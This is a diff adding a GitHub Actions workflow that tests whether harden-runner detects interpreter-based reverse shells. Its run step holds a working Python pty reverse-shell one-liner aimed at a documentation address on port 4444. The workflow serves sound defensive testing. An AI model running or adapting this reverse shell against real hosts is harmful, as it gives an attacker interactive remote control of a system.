@@ -1,0 +1,27 @@
+name: Reverse Shell Interpreter Canary
+
+# Validates interpreter-based reverse-shell detection (python pty.spawn) against the
+# published step-security/harden-runner@v2 agent. The classic bash /dev/tcp pattern
+# was already detected; this covers the interpreter pattern. No listener is needed:
+# the classifier inspects the process argv, so it is detected even though the
+# connection to the unrouted TEST-NET-3 address times out.
+
+on:
+  push:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  reverse-shell-interpreter:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: step-security/harden-runner@v2
+        with:
+          egress-policy: audit
+
+      - name: python pty reverse shell
+        if: always()
+        run: |
+          timeout 8 python3 -c 'import socket,os,pty;s=socket.socket();s.settimeout(5);s.connect(("203.0.113.20",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")' || true
